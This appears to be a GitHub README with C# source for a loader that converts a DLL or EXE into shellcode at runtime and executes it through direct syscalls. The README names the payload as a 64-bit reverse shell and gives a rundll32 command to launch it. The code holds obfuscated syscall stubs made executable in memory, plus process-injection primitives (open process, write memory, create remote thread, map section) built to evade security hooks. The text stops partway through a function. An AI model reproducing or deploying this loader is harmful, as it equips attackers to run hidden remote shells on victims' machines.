# LoadDLLFromFileAndConvertToShellcode
Load DLL or EXE file and convert to shellcode at runtime

This use https://github.com/monoxgas/sRDI/blob/master/DotNet/Program.cs to load and convert DLL or EXE to shellcode at runtime, shellcode is executed with syscalls. The loaded payload is C:\Windows\Tasks\shell64.dll, 64 bit reverse shell.

Compile: csc.exe use https://github.com/mobdk/compilecs to insert entrypoint exec

Execution example:

rundll32 LoadAndInject.dll,exec

LoadAndInject.cs:

```
using System;
using System.Security;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.ConstrainedExecution;
using System.Management;
using System.Security.Principal;
using System.Collections.Generic;
using System.ComponentModel;
using System.Security.Permissions;
using Microsoft.Win32.SafeHandles;
using System.Linq;
using System.Reflection;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
using System.IO;




public class Code
{

    public const uint GENERIC_ALL = 0x1FFFFF;
    public const UInt64 MEM_COMMIT = 0x00001000;
    public const UInt64 MEM_RESERVE = 0x00002000;
    public const ushort PAGE_NOACCESS = 0x01;
    public const ushort PAGE_READONLY = 0x02;
    public const ushort PAGE_READWRITE = 0x04;
    public const ushort PAGE_WRITECOPY = 0x08;
    public const ushort PAGE_EXECUTE = 0x10;
    public const ushort PAGE_EXECUTE_READ = 0x20;
    public const ushort PAGE_EXECUTE_READWRITE = 0x40;
    public const ushort PAGE_EXECUTE_WRITECOPY = 0x80;
    public const UInt32 PAGE_NOCACHE = 0x200;
    public const UInt64 IMAGE_SCN_MEM_DISCARDABLE = 0x02000000;
    public const UInt64 IMAGE_SCN_MEM_EXECUTE = 0x20000000;
    public const UInt64 IMAGE_SCN_MEM_READ = 0x40000000;
    public const UInt64 IMAGE_SCN_MEM_WRITE = 0x80000000;
    public const UInt64 IMAGE_SCN_MEM_NOT_CACHED = 0x04000000;
    public const UInt32 MEM_DECOMMIT = 0x4000;
    public const UInt32 IMAGE_FILE_EXECUTABLE_IMAGE = 0x0002;
    public const UInt32 IMAGE_FILE_DLL = 0x2000;
    public const ushort IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE = 0x40;
    public const UInt32 IMAGE_DLLCHARACTERISTICS_NX_COMPAT = 0x100;
    public const UInt32 MEM_RELEASE = 0x8000;
    public const UInt32 TOKEN_QUERY = 0x0008;
    public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const ushort SE_PRIVILEGE_ENABLED = 0x2;
    public const UInt32 ERROR_NO_TOKEN = 0x3f0;

  [StructLayout(LayoutKind.Sequential)]
  public struct OBJECT_ATTRIBUTES
  {
      public ulong Length;
      public IntPtr RootDirectory;
      public IntPtr ObjectName;
      public ulong Attributes;
      public IntPtr SecurityDescriptor;
      public IntPtr SecurityQualityOfService;
  }

  public struct CLIENT_ID
  {
      public IntPtr UniqueProcess;
      public IntPtr UniqueThread;
  }

  public enum NTSTATUS : uint
  {
      Success = 0x00000000,
      Wait0 = 0x00000000,
      Wait1 = 0x00000001,
      Wait2 = 0x00000002,
      Wait3 = 0x00000003,
      Wait63 = 0x0000003f,
      Abandoned = 0x00000080,
      AbandonedWait0 = 0x00000080,
      AbandonedWait1 = 0x00000081,
      AbandonedWait2 = 0x00000082,
      AbandonedWait3 = 0x00000083,
      AbandonedWait63 = 0x000000bf,
      UserApc = 0x000000c0,
      KernelApc = 0x00000100,
      Alerted = 0x00000101,
      Timeout = 0x00000102,
      Pending = 0x00000103,
      Reparse = 0x00000104,
      MoreEntries = 0x00000105,
      NotAllAssigned = 0x00000106,
      SomeNotMapped = 0x00000107,
      OpLockBreakInProgress = 0x00000108,
      VolumeMounted = 0x00000109,
      RxActCommitted = 0x0000010a,
      NotifyCleanup = 0x0000010b,
      NotifyEnumDir = 0x0000010c,
      NoQuotasForAccount = 0x0000010d,
      PrimaryTransportConnectFailed = 0x0000010e,
      PageFaultTransition = 0x00000110,
      PageFaultDemandZero = 0x00000111,
      PageFaultCopyOnWrite = 0x00000112,
      PageFaultGuardPage = 0x00000113,
      PageFaultPagingFile = 0x00000114,
      CrashDump = 0x00000116,
      ReparseObject = 0x00000118,
      NothingToTerminate = 0x00000122,
      ProcessNotInJob = 0x00000123,
      ProcessInJob = 0x00000124,
      ProcessCloned = 0x00000129,
      FileLockedWithOnlyReaders = 0x0000012a,
      FileLockedWithWriters = 0x0000012b,
      Informational = 0x40000000,
      ObjectNameExists = 0x40000000,
      ThreadWasSuspended = 0x40000001,
      WorkingSetLimitRange = 0x40000002,
      ImageNotAtBase = 0x40000003,
      RegistryRecovered = 0x40000009,
      Warning = 0x80000000,
      GuardPageViolation = 0x80000001,
      DatatypeMisalignment = 0x80000002,
      Breakpoint = 0x80000003,
      SingleStep = 0x80000004,
      BufferOverflow = 0x80000005,
      NoMoreFiles = 0x80000006,
      HandlesClosed = 0x8000000a,
      PartialCopy = 0x8000000d,
      DeviceBusy = 0x80000011,
      InvalidEaName = 0x80000013,
      EaListInconsistent = 0x80000014,
      NoMoreEntries = 0x8000001a,
      LongJump = 0x80000026,
      DllMightBeInsecure = 0x8000002b,
      Error = 0xc0000000,
      Unsuccessful = 0xc0000001,
      NotImplemented = 0xc0000002,
      InvalidInfoClass = 0xc0000003,
      InfoLengthMismatch = 0xc0000004,
      AccessViolation = 0xc0000005,
      InPageError = 0xc0000006,
      PagefileQuota = 0xc0000007,
      InvalidHandle = 0xc0000008,
      BadInitialStack = 0xc0000009,
      BadInitialPc = 0xc000000a,
      InvalidCid = 0xc000000b,
      TimerNotCanceled = 0xc000000c,
      InvalidParameter = 0xc000000d,
      NoSuchDevice = 0xc000000e,
      NoSuchFile = 0xc000000f,
      InvalidDeviceRequest = 0xc0000010,
      EndOfFile = 0xc0000011,
      WrongVolume = 0xc0000012,
      NoMediaInDevice = 0xc0000013,
      NoMemory = 0xc0000017,
      ConflictingAddresses = 0xc0000018,
      NotMappedView = 0xc0000019,
      UnableToFreeVm = 0xc000001a,
      UnableToDeleteSection = 0xc000001b,
      IllegalInstruction = 0xc000001d,
      AlreadyCommitted = 0xc0000021,
      AccessDenied = 0xc0000022,
      BufferTooSmall = 0xc0000023,
      ObjectTypeMismatch = 0xc0000024,
      NonContinuableException = 0xc0000025,
      BadStack = 0xc0000028,
      NotLocked = 0xc000002a,
      NotCommitted = 0xc000002d,
      InvalidParameterMix = 0xc0000030,
      ObjectNameInvalid = 0xc0000033,
      ObjectNameNotFound = 0xc0000034,
      ObjectNameCollision = 0xc0000035,
      ObjectPathInvalid = 0xc0000039,
      ObjectPathNotFound = 0xc000003a,
      ObjectPathSyntaxBad = 0xc000003b,
      DataOverrun = 0xc000003c,
      DataLate = 0xc000003d,
      DataError = 0xc000003e,
      CrcError = 0xc000003f,
      SectionTooBig = 0xc0000040,
      PortConnectionRefused = 0xc0000041,
      InvalidPortHandle = 0xc0000042,
      SharingViolation = 0xc0000043,
      QuotaExceeded = 0xc0000044,
      InvalidPageProtection = 0xc0000045,
      MutantNotOwned = 0xc0000046,
      SemaphoreLimitExceeded = 0xc0000047,
      PortAlreadySet = 0xc0000048,
      SectionNotImage = 0xc0000049,
      SuspendCountExceeded = 0xc000004a,
      ThreadIsTerminating = 0xc000004b,
      BadWorkingSetLimit = 0xc000004c,
      IncompatibleFileMap = 0xc000004d,
      SectionProtection = 0xc000004e,
      EasNotSupported = 0xc000004f,
      EaTooLarge = 0xc0000050,
      NonExistentEaEntry = 0xc0000051,
      NoEasOnFile = 0xc0000052,
      EaCorruptError = 0xc0000053,
      FileLockConflict = 0xc0000054,
      LockNotGranted = 0xc0000055,
      DeletePending = 0xc0000056,
      CtlFileNotSupported = 0xc0000057,
      UnknownRevision = 0xc0000058,
      RevisionMismatch = 0xc0000059,
      InvalidOwner = 0xc000005a,
      InvalidPrimaryGroup = 0xc000005b,
      NoImpersonationToken = 0xc000005c,
      CantDisableMandatory = 0xc000005d,
      NoLogonServers = 0xc000005e,
      NoSuchLogonSession = 0xc000005f,
      NoSuchPrivilege = 0xc0000060,
      PrivilegeNotHeld = 0xc0000061,
      InvalidAccountName = 0xc0000062,
      UserExists = 0xc0000063,
      NoSuchUser = 0xc0000064,
      GroupExists = 0xc0000065,
      NoSuchGroup = 0xc0000066,
      MemberInGroup = 0xc0000067,
      MemberNotInGroup = 0xc0000068,
      LastAdmin = 0xc0000069,
      WrongPassword = 0xc000006a,
      IllFormedPassword = 0xc000006b,
      PasswordRestriction = 0xc000006c,
      LogonFailure = 0xc000006d,
      AccountRestriction = 0xc000006e,
      InvalidLogonHours = 0xc000006f,
      InvalidWorkstation = 0xc0000070,
      PasswordExpired = 0xc0000071,
      AccountDisabled = 0xc0000072,
      NoneMapped = 0xc0000073,
      TooManyLuidsRequested = 0xc0000074,
      LuidsExhausted = 0xc0000075,
      InvalidSubAuthority = 0xc0000076,
      InvalidAcl = 0xc0000077,
      InvalidSid = 0xc0000078,
      InvalidSecurityDescr = 0xc0000079,
      ProcedureNotFound = 0xc000007a,
      InvalidImageFormat = 0xc000007b,
      NoToken = 0xc000007c,
      BadInheritanceAcl = 0xc000007d,
      RangeNotLocked = 0xc000007e,
      DiskFull = 0xc000007f,
      ServerDisabled = 0xc0000080,
      ServerNotDisabled = 0xc0000081,
      TooManyGuidsRequested = 0xc0000082,
      GuidsExhausted = 0xc0000083,
      InvalidIdAuthority = 0xc0000084,
      AgentsExhausted = 0xc0000085,
      InvalidVolumeLabel = 0xc0000086,
      SectionNotExtended = 0xc0000087,
      NotMappedData = 0xc0000088,
      ResourceDataNotFound = 0xc0000089,
      ResourceTypeNotFound = 0xc000008a,
      ResourceNameNotFound = 0xc000008b,
      ArrayBoundsExceeded = 0xc000008c,
      FloatDenormalOperand = 0xc000008d,
      FloatDivideByZero = 0xc000008e,
      FloatInexactResult = 0xc000008f,
      FloatInvalidOperation = 0xc0000090,
      FloatOverflow = 0xc0000091,
      FloatStackCheck = 0xc0000092,
      FloatUnderflow = 0xc0000093,
      IntegerDivideByZero = 0xc0000094,
      IntegerOverflow = 0xc0000095,
      PrivilegedInstruction = 0xc0000096,
      TooManyPagingFiles = 0xc0000097,
      FileInvalid = 0xc0000098,
      InstanceNotAvailable = 0xc00000ab,
      PipeNotAvailable = 0xc00000ac,
      InvalidPipeState = 0xc00000ad,
      PipeBusy = 0xc00000ae,
      IllegalFunction = 0xc00000af,
      PipeDisconnected = 0xc00000b0,
      PipeClosing = 0xc00000b1,
      PipeConnected = 0xc00000b2,
      PipeListening = 0xc00000b3,
      InvalidReadMode = 0xc00000b4,
      IoTimeout = 0xc00000b5,
      FileForcedClosed = 0xc00000b6,
      ProfilingNotStarted = 0xc00000b7,
      ProfilingNotStopped = 0xc00000b8,
      NotSameDevice = 0xc00000d4,
      FileRenamed = 0xc00000d5,
      CantWait = 0xc00000d8,
      PipeEmpty = 0xc00000d9,
      CantTerminateSelf = 0xc00000db,
      InternalError = 0xc00000e5,
      InvalidParameter1 = 0xc00000ef,
      InvalidParameter2 = 0xc00000f0,
      InvalidParameter3 = 0xc00000f1,
      InvalidParameter4 = 0xc00000f2,
      InvalidParameter5 = 0xc00000f3,
      InvalidParameter6 = 0xc00000f4,
      InvalidParameter7 = 0xc00000f5,
      InvalidParameter8 = 0xc00000f6,
      InvalidParameter9 = 0xc00000f7,
      InvalidParameter10 = 0xc00000f8,
      InvalidParameter11 = 0xc00000f9,
      InvalidParameter12 = 0xc00000fa,
      MappedFileSizeZero = 0xc000011e,
      TooManyOpenedFiles = 0xc000011f,
      Cancelled = 0xc0000120,
      CannotDelete = 0xc0000121,
      InvalidComputerName = 0xc0000122,
      FileDeleted = 0xc0000123,
      SpecialAccount = 0xc0000124,
      SpecialGroup = 0xc0000125,
      SpecialUser = 0xc0000126,
      MembersPrimaryGroup = 0xc0000127,
      FileClosed = 0xc0000128,
      TooManyThreads = 0xc0000129,
      ThreadNotInProcess = 0xc000012a,
      TokenAlreadyInUse = 0xc000012b,
      PagefileQuotaExceeded = 0xc000012c,
      CommitmentLimit = 0xc000012d,
      InvalidImageLeFormat = 0xc000012e,
      InvalidImageNotMz = 0xc000012f,
      InvalidImageProtect = 0xc0000130,
      InvalidImageWin16 = 0xc0000131,
      LogonServer = 0xc0000132,
      DifferenceAtDc = 0xc0000133,
      SynchronizationRequired = 0xc0000134,
      DllNotFound = 0xc0000135,
      IoPrivilegeFailed = 0xc0000137,
      OrdinalNotFound = 0xc0000138,
      EntryPointNotFound = 0xc0000139,
      ControlCExit = 0xc000013a,
      PortNotSet = 0xc0000353,
      DebuggerInactive = 0xc0000354,
      CallbackBypass = 0xc0000503,
      PortClosed = 0xc0000700,
      MessageLost = 0xc0000701,
      InvalidMessage = 0xc0000702,
      RequestCanceled = 0xc0000703,
      RecursiveDispatch = 0xc0000704,
      LpcReceiveBufferExpected = 0xc0000705,
      LpcInvalidConnectionUsage = 0xc0000706,
      LpcRequestsNotAllowed = 0xc0000707,
      ResourceInUse = 0xc0000708,
      ProcessIsProtected = 0xc0000712,
      VolumeDirty = 0xc0000806,
      FileCheckedOut = 0xc0000901,
      CheckOutRequired = 0xc0000902,
      BadFileType = 0xc0000903,
      FileTooLarge = 0xc0000904,
      FormsAuthRequired = 0xc0000905,
      VirusInfected = 0xc0000906,
      VirusDeleted = 0xc0000907,
      TransactionalConflict = 0xc0190001,
      InvalidTransaction = 0xc0190002,
      TransactionNotActive = 0xc0190003,
      TmInitializationFailed = 0xc0190004,
      RmNotActive = 0xc0190005,
      RmMetadataCorrupt = 0xc0190006,
      TransactionNotJoined = 0xc0190007,
      DirectoryNotRm = 0xc0190008,
      CouldNotResizeLog = 0xc0190009,
      TransactionsUnsupportedRemote = 0xc019000a,
      LogResizeInvalidSize = 0xc019000b,
      RemoteFileVersionMismatch = 0xc019000c,
      CrmProtocolAlreadyExists = 0xc019000f,
      TransactionPropagationFailed = 0xc0190010,
      CrmProtocolNotFound = 0xc0190011,
      TransactionSuperiorExists = 0xc0190012,
      TransactionRequestNotValid = 0xc0190013,
      TransactionNotRequested = 0xc0190014,
      TransactionAlreadyAborted = 0xc0190015,
      TransactionAlreadyCommitted = 0xc0190016,
      TransactionInvalidMarshallBuffer = 0xc0190017,
      CurrentTransactionNotValid = 0xc0190018,
      LogGrowthFailed = 0xc0190019,
      ObjectNoLongerExists = 0xc0190021,
      StreamMiniversionNotFound = 0xc0190022,
      StreamMiniversionNotValid = 0xc0190023,
      MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
      CantOpenMiniversionWithModifyIntent = 0xc0190025,
      CantCreateMoreStreamMiniversions = 0xc0190026,
      HandleNoLongerValid = 0xc0190028,
      NoTxfMetadata = 0xc0190029,
      LogCorruptionDetected = 0xc0190030,
      CantRecoverWithHandleOpen = 0xc0190031,
      RmDisconnected = 0xc0190032,
      EnlistmentNotSuperior = 0xc0190033,
      RecoveryNotNeeded = 0xc0190034,
      RmAlreadyStarted = 0xc0190035,
      FileIdentityNotPersistent = 0xc0190036,
      CantBreakTransactionalDependency = 0xc0190037,
      CantCrossRmBoundary = 0xc0190038,
      TxfDirNotEmpty = 0xc0190039,
      IndoubtTransactionsExist = 0xc019003a,
      TmVolatile = 0xc019003b,
      RollbackTimerExpired = 0xc019003c,
      TxfAttributeCorrupt = 0xc019003d,
      EfsNotAllowedInTransaction = 0xc019003e,
      TransactionalOpenNotAllowed = 0xc019003f,
      TransactedMappingUnsupportedRemote = 0xc0190040,
      TxfMetadataAlreadyPresent = 0xc0190041,
      TransactionScopeCallbacksNotSet = 0xc0190042,
      TransactionRequiredPromotion = 0xc0190043,
      CannotExecuteFileInTransaction = 0xc0190044,
      TransactionsNotFrozen = 0xc0190045,
      MaximumNtStatus = 0xffffffff
};

  [Flags]
  public enum MemoryProtection : uint
  {
      AccessDenied = 0x0,
      Execute = 0x10,
      ExecuteRead = 0x20,
      ExecuteReadWrite = 0x40,
      ExecuteWriteCopy = 0x80,
      Guard = 0x100,
      NoCache = 0x200,
      WriteCombine = 0x400,
      NoAccess = 0x01,
      ReadOnly = 0x02,
      ReadWrite = 0x04,
      WriteCopy = 0x08,
      //SEC_NO_CHANGE = 0x00400000
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  struct STARTUPINFO
  {
      public Int32 cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public Int32 dwX;
      public Int32 dwY;
      public Int32 dwXSize;
      public Int32 dwYSize;
      public Int32 dwXCountChars;
      public Int32 dwYCountChars;
      public Int32 dwFillAttribute;
      public Int32 dwFlags;
      public Int16 wShowWindow;
      public Int16 cbReserved2;
      public IntPtr lpReserved2;
      public IntPtr hStdInput;
      public IntPtr hStdOutput;
      public IntPtr hStdError;
  }

  [StructLayout(LayoutKind.Sequential)]
  internal struct PROCESS_INFORMATION
  {
      public IntPtr hProcess;
      public IntPtr hThread;
      public int dwProcessId;
      public int dwThreadId;
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  struct STARTUPINFOEX
  {
      public STARTUPINFO StartupInfo;
      public IntPtr lpAttributeList;
  }


  [StructLayout(LayoutKind.Sequential, Pack = 4)]
  public struct NtCreateThreadExBuffer
  {
      public int Size;
      public uint Unknown1;
      public uint Unknown2;
      public IntPtr Unknown3;
      public uint Unknown4;
      public uint Unknown5;
      public uint Unknown6;
      public IntPtr Unknown7;
      public uint Unknown8;
  };

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  public struct OSVERSIONINFOEXW
  {
      public int dwOSVersionInfoSize;
      public int dwMajorVersion;
      public int dwMinorVersion;
      public int dwBuildNumber;
      public int dwPlatformId;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
      public string szCSDVersion;
      public UInt16 wServicePackMajor;
      public UInt16 wServicePackMinor;
      public UInt16 wSuiteMask;
      public byte wProductType;
      public byte wReserved;
  }

  [StructLayout(LayoutKind.Sequential)]
  public struct LARGE_INTEGER
  {
      public UInt32 LowPart;
      public UInt32 HighPart;
  }

  [StructLayout(LayoutKind.Sequential)]
  public struct SYSTEM_INFO
  {
      public uint dwOem;
      public uint dwPageSize;
      public IntPtr lpMinAppAddress;
      public IntPtr lpMaxAppAddress;
      public IntPtr dwActiveProcMask;
      public uint dwNumProcs;
      public uint dwProcType;
      public uint dwAllocGranularity;
      public ushort wProcLevel;
      public ushort wProcRevision;
  }


  [Flags]
  public enum ProcessAccessFlags : uint
  {
      All = 0x001F0FFF,
      Terminate = 0x00000001,
      CreateThread = 0x00000002,
      VirtualMemoryOperation = 0x00000008,
      VirtualMemoryRead = 0x00000010,
      VirtualMemoryWrite = 0x00000020,
      DuplicateHandle = 0x00000040,
      CreateProcess = 0x000000080,
      SetQuota = 0x00000100,
      SetInformation = 0x00000200,
      QueryInformation = 0x00000400,
      QueryLimitedInformation = 0x00001000,
      Synchronize = 0x00100000
  }

    [DllImport("kernel32.dll", SetLastError = true)]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SuppressUnmanagedCodeSecurity]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern bool ZwOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
    public static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

    [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 GetProcessId(IntPtr Handle);

    //[SecurityCritical]
    [SuppressUnmanagedCodeSecurity]
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern NTSTATUS RtlGetVersion(ref OSVERSIONINFOEXW versionInfo);

    [DllImport("ntdll.dll")]
    public static extern NTSTATUS ZwProtectVirtualMemory( [In] IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, [In] MemoryProtection NewProtect, [Out] out MemoryProtection OldProtect );

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList( IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute( IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwOpenProcessX(out IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwWriteVirtualMemoryX(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS NtAllocateVirtualMemoryX(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS NtCreateThreadExX(out IntPtr threadHandle,uint desiredAccess,IntPtr objectAttributes,IntPtr processHandle,IntPtr lpStartAddress,IntPtr lpParameter,int createSuspended,uint stackZeroBits,uint sizeOfStackCommit,uint sizeOfStackReserve,IntPtr lpBytesBuffer);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS NtCreateSectionX(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS NtMapViewOfSectionX(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS NtProtectVirtualMemoryX(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwCreateProcessX( out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, bool InheritObjectTable, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort);



public static byte [] GetOSVersionAndReturnSyscall(byte sysType )
{
    var syscall = new byte [] { 074, 138, 203, 185, 000, 001, 001, 001, 016, 006, 196 };
    var osVersionInfo = new OSVERSIONINFOEXW { dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEXW)) };
    NTSTATUS OSdata = RtlGetVersion(ref osVersionInfo);
    // Client OS
    if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 18362 || osVersionInfo.dwBuildNumber == 18363)) // 1903 1909
    {
        // ZwOpenProcess
        if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // NtCreateThreadEx
        if (sysType == 2) { syscall[4] = 190; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // ZwWriteVirtualMemory
        if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // NtAllocateVirtualMemory
        if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // NtCreateSection
        if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // NtMapViewOfSection
        if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // ZwCreateProcess
        if (sysType == 7) { syscall[4] = 182; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
    } else
    if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17134)) // 1803
    {
        // ZwOpenProcess
        if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // NtCreateThreadEx
        if (sysType == 2) { syscall[4] = 188; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // ZwWriteVirtualMemory
        if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // NtAllocateVirtualMemory
        if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // NtCreateSection
        if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // NtMapViewOfSection
        if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // ZwCreateProcess
        if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
    } else
    if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17763)) // 1809
    {
        // ZwOpenProcess
        if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // NtCreateThreadEx
        if (sysType == 2) { syscall[4] = 189; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // ZwWriteVirtualMemory
        if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // NtAllocateVirtualMemory
        if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // NtCreateSection
        if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // NtMapViewOfSection
        if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
        // ZwCreateProcess
        if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
    }
    return syscall;
}


    public static NTSTATUS ZwOpenProcess(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 1 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                ZwOpenProcessX ZwOpenProcessFunc = (ZwOpenProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwOpenProcessX));
                return (NTSTATUS)ZwOpenProcessFunc(out hProcess, processAccess, objAttribute, ref clientid);
            }

        }
    }

    public static NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 2 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                NtCreateThreadExX NtCreateThreadExFunc = (NtCreateThreadExX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtCreateThreadExX));
                return (NTSTATUS)NtCreateThreadExFunc(out threadHandle, desiredAccess, objectAttributes, processHandle, lpStartAddress, lpParameter, createSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, lpBytesBuffer);
            }
        }
    }

    public static NTSTATUS ZwWriteVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 3 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
